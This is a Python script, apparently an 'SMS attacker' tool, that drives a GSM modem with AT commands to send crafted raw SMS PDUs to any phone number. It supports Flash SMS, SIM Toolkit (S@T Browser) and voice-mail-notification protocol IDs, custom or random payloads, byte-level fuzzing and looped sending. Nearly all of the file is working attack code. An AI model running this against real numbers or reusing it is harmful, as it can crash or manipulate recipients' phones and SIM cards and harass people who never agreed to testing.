import serial
import time
import logging
import argparse
import configparser
import random
import hashlib
import sys
import os

# Constants
CONFIG_FILE = 'sms_attacker.conf'

# PDU Field Defaults (can be overridden in config)
DEFAULT_TP_PID = '00'  # Standard SMS
DEFAULT_TP_DCS = '00'  # 7-bit encoding, no class
DEFAULT_TP_VP = 'FF'  # Maximum validity period

# Data Coding Scheme values for triggering specific behaviors
DCS_FLASH_SMS = '10'  # Force message to be displayed immediately (Flash SMS)
DCS_GSM_7BIT = '00'  # GSM 7-bit default alphabet
DCS_8BIT = '04'  # 8-bit data encoding
DCS_IMMEDIATE_DISPLAY = '11'  # Another code for Flash SMS that might work

# Protocol ID values for specific actions
PID_DEFAULT = '00'  # Regular SMS
PID_SIM_TOOLKIT = '41'  # SIM Toolkit Data Download (S@T Browser)
PID_VMN = '7F'  # Voice Mail Notification

# SMSC Info
DEFAULT_SMSC_INFO = "00"

# PDU Type
DEFAULT_PDU_TYPE = "00"

# Define custom exception for serial port issues
class SerialPortError(Exception):
    pass

def setup_logging(level):
    """Configures logging based on the specified level."""
    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')

def load_configuration(config_file):
    """Loads configuration from a file, handling missing files gracefully."""
    config = configparser.ConfigParser()
    config.read_dict({  # Apply defaults, so missing config values are handled gracefully
        'serial':{
            'port': '',
            'baudrate': '115200',
            'timeout': '5'
        },
        'pdu': {
            'tp_pid': DEFAULT_TP_PID,
            'tp_dcs': DEFAULT_TP_DCS,
            'tp_vp': DEFAULT_TP_VP,
            'destination_number': '',  # Essential for attacks, but keep empty default
        },
        'sms': {
            'smsc_info': DEFAULT_SMSC_INFO,  # No SMSC, use default
            'pdu_type': DEFAULT_PDU_TYPE,  # SMS-SUBMIT
        },
        'advanced': {
            'fuzz_factor': '0',  # 0 means disabled
            'payload_file': '',
            'loop_count': '1',  # Number of times to send the SMS,
            'sim_command': '',  # For SIM toolkit, the command to send
            'random_payload_length': '0', #If greater than zero, creates a random payload of the specified length
        },
        'fuzzing': {
            'num_fuzz_iterations': '1',  #Number of iterations for fuzzing
            'fuzz_types': 'bitflip,byte_insertion,byte_deletion,byte_overwrite,block_shuffle' #Comma seperated list of fuzz types
        }

    })
    try:
        config.read(config_file)
        # Raise an exception if the config file is empty
        if not config.sections():
            raise FileNotFoundError(f"Configuration file '{config_file}' is empty.")
        return config
    except FileNotFoundError as e:
        logging.error(f"Error loading configuration: {e}. Ensure {config_file} exists and is properly formatted.")
        raise  # Re-raise to stop execution

def initialize_serial(port, baudrate, timeout):
    """Initializes and returns a serial port object, handling exceptions."""
    try:
        modem = serial.Serial(port, baudrate=baudrate, timeout=timeout)
        logging.info(f"Serial connection established on {port} at {baudrate} baud.")
        return modem
    except serial.SerialException as e:
        logging.error(f"Failed to open serial port {port}: {e}")
        raise SerialPortError(f"Could not initialize serial port {port}: {e}")

def send_command(modem, command, delay=0.1):
    """Sends an AT command to the modem, logs the command, and returns the response."""
    logging.debug(f"Sending command: {command}")
    try:
        modem.write(command)
        time.sleep(delay)
        response = modem.read(2048)  # Read a larger chunk, adjust as needed
        decoded_response = response.decode(errors='ignore').strip()
        logging.debug(f"Modem response: {decoded_response}")
        return decoded_response
    except serial.SerialException as e:
        logging.error(f"Error sending command or reading response: {e}")
        raise SerialPortError(f"Error during serial communication: {e}")

def initialize_modem(modem):
    """Initializes the modem, checking for basic functionality."""
    try:
        response = send_command(modem, b'AT\r')
        if 'OK' not in response:
            raise Exception(f"Modem not responding to AT command. Response: {response}")

        response = send_command(modem, b'AT+CMGF=0\r')  # Set PDU mode
        if 'OK' not in response:
            raise Exception(f"Modem failed to set PDU mode. Response: {response}")

        logging.info("Modem initialized successfully.")

    except Exception as e:
        logging.error(f"Modem initialization failed: {e}")
        raise

def encode_number(number):
    """Encodes a phone number for the PDU format."""
    try:
        # Add 'F' if odd length, swap pairs
        if len(number) % 2 != 0:
            number += 'F'  # Use 'F' as the padding character (more common)
        encoded = ''.join([number[i + 1] + number[i] for i in range(0, len(number), 2)])
        return encoded
    except Exception as e:
        logging.error(f"Error encoding phone number: {e}")
        raise

def build_pdu(config, payload, destination_number):
    """Builds a SMS PDU with configurable fields and payload."""
    try:
        smsc_info = config.get('sms', 'smsc_info')  # SMSC, often 00 for default
        pdu_type = config.get('sms', 'pdu_type')  # SMS-SUBMIT
        tp_pid = config.get('pdu', 'tp_pid')  # Protocol Identifier (TP-PID)
        tp_dcs = config.get('pdu', 'tp_dcs')  # Data Coding Scheme (TP-DCS)
        tp_vp = config.get('pdu', 'tp_vp')  # Validity Period

        # Destination Address
        encoded_number = encode_number(destination_number)
        destination_number_length = len(destination_number)
        destination_address_length = f"{destination_number_length:02X}"
        destination_address = encoded_number

        user_data = payload.hex().upper()
        user_data_length = len(payload)  # Raw byte length

        # Assemble
        pdu = smsc_info + pdu_type + destination_address_length + "81" + destination_address + tp_pid + tp_dcs + tp_vp + f"{user_data_length:02X}" + user_data
        return pdu

    except Exception as e:
        logging.error(f"Error building PDU: {e}")
        raise

def send_sms_pdu(modem, pdu):
    """Sends a raw SMS PDU to the modem."""
    try:
        pdu_length = len(pdu) // 2
        send_command(modem, b'AT+CMGS=' + bytes(str(pdu_length), 'utf-8') + b'\r', delay=0.5)
        response = send_command(modem, pdu.encode('utf-8') + b'\x1A', delay=0.5)

        if '+CMGS' in response:
            logging.info("SMS PDU sent successfully (or at least the modem accepted it).")
            return True  # Indicate Success
        else:
            logging.warning(f"Possible error sending SMS. Response: {response}")
            return False  # Indicate Failure

    except Exception as e:
        logging.error(f"Error sending SMS PDU: {e}")
        raise

def generate_random_payload(length):
    """Generates a random payload of the specified length."""
    try:
        if length <= 0:
            raise ValueError("Random payload length must be greater than zero")
        return os.urandom(length) #Much faster than the previous implementation
    except Exception as e:
        logging.error(f"Error generating random payload: {e}")
        raise

def fuzz_payload(payload, fuzz_factor, fuzz_iterations, fuzz_types):
    """Fuzzes the payload using multiple iterations and different strategies."""
    if fuzz_factor <= 0:
        logging.info("Fuzzing is disabled (fuzz_factor is 0)")
        return payload #No Fuzzing

    fuzzed_payload = bytearray(payload) #Make mutable

    for i in range(fuzz_iterations):
        fuzz_type = random.choice(fuzz_types)
        logging.debug(f"Fuzzing iteration {i+1}: {fuzz_type} with fuzz factor {fuzz_factor}%")
        num_bytes_to_fuzz = int(len(fuzzed_payload) * (fuzz_factor / 100))
        if num_bytes_to_fuzz == 0 and len(fuzzed_payload) > 0: #Ensure at least 1 byte is fuzzed if possible
            num_bytes_to_fuzz = 1

        if fuzz_type == 'bitflip':
            for _ in range(num_bytes_to_fuzz):
                if len(fuzzed_payload) > 0:
                    index = random.randint(0, len(fuzzed_payload) - 1)
                    bit_index = random.randint(0, 7)
                    fuzzed_payload[index] ^= (1 << bit_index)

        elif fuzz_type == 'byte_insertion':
            for _ in range(num_bytes_to_fuzz): #Insert multiple bytes
                index = random.randint(0, len(fuzzed_payload))
                random_byte = random.randint(0, 255)
                fuzzed_payload.insert(index, random_byte)

        elif fuzz_type == 'byte_deletion':
            for _ in range(num_bytes_to_fuzz): #Delete multiple bytes
                if len(fuzzed_payload) > 0:
                    index = random.randint(0, len(fuzzed_payload) - 1)
                    del fuzzed_payload[index]

        elif fuzz_type == 'byte_overwrite':
            for _ in range(num_bytes_to_fuzz): #Overwrite multiple bytes
                if len(fuzzed_payload) > 0:
                    index = random.randint(0, len(fuzzed_payload) - 1)
                    random_byte = random.randint(0, 255)
                    fuzzed_payload[index] = random_byte

        elif fuzz_type == 'block_shuffle':
             block_size = 16  # Shuffle in 16-byte blocks. Adjustable.
             if len(fuzzed_payload) >= block_size:
                 num_blocks = len(fuzzed_payload) // block_size
                 blocks = [fuzzed_payload[i * block_size:(i + 1) * block_size] for i in range(num_blocks)]
                 random.shuffle(blocks)
                 fuzzed_payload = bytearray(b''.join(blocks)) #Reassemble

    return bytes(fuzzed_payload)

def load_payload_from_file(filename):
    """Loads a payload from the specified file, reading as raw bytes."""
    try:
        with open(filename, 'rb') as f:  # Binary read mode
            payload = f.read()
        logging.info(f"Payload loaded from {filename}")
        return payload
    except FileNotFoundError:
        logging.error(f"Payload file not found: {filename}")
        return None
    except Exception as e:
        logging.error(f"Error loading payload from file: {e}")
        return None

def calculate_sha256(data):
    """Calculates the SHA256 hash of the given data."""
    hash_object = hashlib.sha256(data)
    hex_dig = hash_object.hexdigest()
    return hex_dig

def main():
    """Main function to parse arguments, load config, and run the attack."""
    parser = argparse.ArgumentParser(description="Send crafted SMS PDU to a GSM modem.")
    # Required Arguments
    required = parser.add_argument_group('required arguments')
    required.add_argument("-n", "--number", dest="destination_number", help="Destination phone number", required=True)

    # Serial Configuration
    serial_group = parser.add_argument_group('serial configuration')
    serial_group.add_argument("--port", dest="serial_port", help="Serial port (e.g., /dev/ttyUSB0)", required=False)
    serial_group.add_argument("--baud", type=int, dest="baud_rate", help="Baud rate", required=False)
    serial_group.add_argument("--timeout", type=int, dest="serial_timeout", help="Serial timeout (seconds)", required=False)

    # PDU Configuration
    pdu_group = parser.add_argument_group('pdu configuration')
    pdu_group.add_argument("--pid", help="Protocol ID (TP-PID)", required=False)
    pdu_group.add_argument("--dcs", help="Data Coding Scheme (TP-DCS)", required=False)
    pdu_group.add_argument("--vp", help="Validity Period (TP-VP)", required=False)
    pdu_group.add_argument("--smsc", help="SMSC Information (SMSC)", required=False)
    pdu_group.add_argument("--pdu-type", help="PDU Type (PDU)", required=False)

    # Payload Options
    payload_group = parser.add_argument_group('payload options')
    payload_group.add_argument("-p", "--payload", help="Payload string to inject (raw bytes)", required=False)
    payload_group.add_argument("--payload-file", dest="payload_file", help="File to load payload from", required=False)
    payload_group.add_argument("--random-payload-length", type=int, dest="random_payload_length", help="Generate a random payload of specified length", required=False)
    payload_group.add_argument("--sim-command", dest="sim_command", help="SIM Toolkit command (hex string)", required=False)

    # Fuzzing and Looping
    attack_group = parser.add_argument_group('attack options')
    attack_group.add_argument("--fuzz", type=int, dest="fuzz_factor", help="Fuzz factor (percentage of bytes to modify)", required=False)
    attack_group.add_argument("--loop", type=int, dest="loop_count", help="Number of times to loop the attack.", required=False)
    attack_group.add_argument("--fuzz-iterations", type=int, dest="fuzz_iterations", help="Number of fuzzing iterations per payload (default: 1)", required=False)
    attack_group.add_argument("--fuzz-types", dest="fuzz_types", help="Comma-separated list of fuzzing types", required=False)

    # Other Options
    other_group = parser.add_argument_group('other options')
    other_group.add_argument("--sha256", action="store_true", help="Calculate and print SHA256 hash of the final PDU", required=False)
    other_group.add_argument("--exit-on-success", action="store_true", help="Exit immediately after sending a successful SMS (useful for automated testing)", required=False)
    other_group.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging (DEBUG level).")
    other_group.add_argument("-c", "--config", default=CONFIG_FILE, help=f"Path to the configuration file (default: {CONFIG_FILE}).")

    args = parser.parse_args()

    # Set logging level
    log_level = logging.DEBUG if args.verbose else logging.INFO
    setup_logging(log_level)

    try:
        # Load configuration
        config = load_configuration(args.config)

        # Override config file with command line arguments
        if args.pid:
            config.set('pdu', 'tp_pid', args.pid)
        if args.dcs:
            config.set('pdu', 'tp_dcs', args.dcs)
        if args.vp:
            config.set('pdu', 'tp_vp', args.vp)
        if args.smsc:
            config.set('sms', 'smsc_info', args.smsc)
        if args.pdu_type:
            config.set('sms', 'pdu_type', args.pdu_type)

        # Extract serial configuration values, prioritizing command-line arguments
        serial_port = args.serial_port if args.serial_port else config.get('serial', 'port')
        baud_rate = args.baud_rate if args.baud_rate else config.getint('serial', 'baudrate')
        timeout = args.serial_timeout if args.serial_timeout else config.getint('serial', 'timeout')

        fuzz_factor = config.getint('advanced', 'fuzz_factor')  # Default is 0, so disabled
        loop_count = config.getint('advanced', 'loop_count')
        fuzz_iterations = int(config.get('fuzzing', 'num_fuzz_iterations')) #Fuzz Iterations from Config
        fuzz_types_str = config.get('fuzzing', 'fuzz_types')  # Comma-separated string from config
        fuzz_types = [s.strip() for s in fuzz_types_str.split(',')] # to list

        #Destination number
        destination_number = args.destination_number #Required arg

        # Payload Selection
        payload = b""  # Default empty

        if args.payload_file:
            payload = load_payload_from_file(args.payload_file)
            if payload is None:  # Error loading file
                sys.exit(1)
        elif args.payload:
            try:
                payload = bytes.fromhex(args.payload)  # Convert hex string to bytes
            except ValueError as e:
                logging.error(f"Invalid hexadecimal payload specified: {e}")
                sys.exit(1)
        elif args.sim_command:
             try:
                 payload = bytes.fromhex(args.sim_command)
                 logging.info("Using SIM Toolkit command from command line as payload.")
             except ValueError as e:
                 logging.error(f"Invalid SIM Toolkit command specified: {e}")
                 sys.exit(1)

        elif args.random_payload_length and args.random_payload_length > 0:
             try:
                 payload = generate_random_payload(args.random_payload_length)
                 logging.info(f"Generated random payload of length {args.random_payload_length}")
             except ValueError as e:
                 logging.error(f"Invalid random payload length: {e}")
                 sys.exit(1)


        else:
            logging.warning("No payload specified. Sending empty SMS.")

         #Override Config with CLI args

        if args.fuzz_iterations is not None:
            fuzz_iterations = args.fuzz_iterations #Override from CLI
        if args.fuzz_factor is not None:  # Command line overrides config
            fuzz_factor = args.fuzz_factor
        if args.loop_count is not None:
            loop_count = args.loop_count
        if args.fuzz_types:
            fuzz_types = [s.strip() for s in args.fuzz_types.split(',')]#Override fuzz types



        # Initialize serial port
        modem = initialize_serial(serial_port, baud_rate, timeout)

        try:
            # Initialize modem
            initialize_modem(modem)

            # Loop the Attack
            for i in range(loop_count):
                logging.info(f"Starting Loop {i + 1} of {loop_count}")

                # Apply fuzzing to the payload
                try:
                    fuzzed_payload = fuzz_payload(payload, fuzz_factor, fuzz_iterations, fuzz_types)
                except Exception as e:
                    logging.error(f"Error during fuzzing: {e}")
                    continue #Go to next loop

                # Build PDU
                try:
                    pdu = build_pdu(config, fuzzed_payload, destination_number)
                    logging.debug(f"Generated PDU: {pdu}")
                except Exception as e:
                    logging.error(f"Error building PDU: {e}")
                    continue #Go to next loop

                # Calculate SHA256 hash if requested
                if args.sha256:
                    sha256_hash = calculate_sha256(pdu.encode('utf-8'))
                    print(f"SHA256 Hash: {sha256_hash}")

                # Send SMS PDU
                try:
                    success = send_sms_pdu(modem, pdu)  # Get success or failure
                except Exception as e:
                    logging.error(f"Error sending SMS: {e}")
                    continue #Go to next loop

                if success and args.exit_on_success:
                    logging.info("Exiting on success as requested.")
                    sys.exit(0)  # Clean exit
                elif not success:
                    logging.warning("SMS Sending failed, continuing...")

        finally:
            # Ensure the serial port is closed
            if modem.is_open:
                modem.close()
                logging.info("Serial connection closed.")

    except FileNotFoundError:
        # Already handled and logged in load_configuration
        pass
    except ValueError as e:
        logging.error(e)
        sys.exit(1)  # Exit on error
    except SerialPortError as e: #Custom Exception
        logging.critical(f"Serial port error: {e}")
        sys.exit(1) #Exit on serial port error
    except Exception as e:
        logging.critical(f"An unrecoverable error occurred: {e}")
        sys.exit(1)  # Exit on critical error

if __name__ == "__main__":
    main()
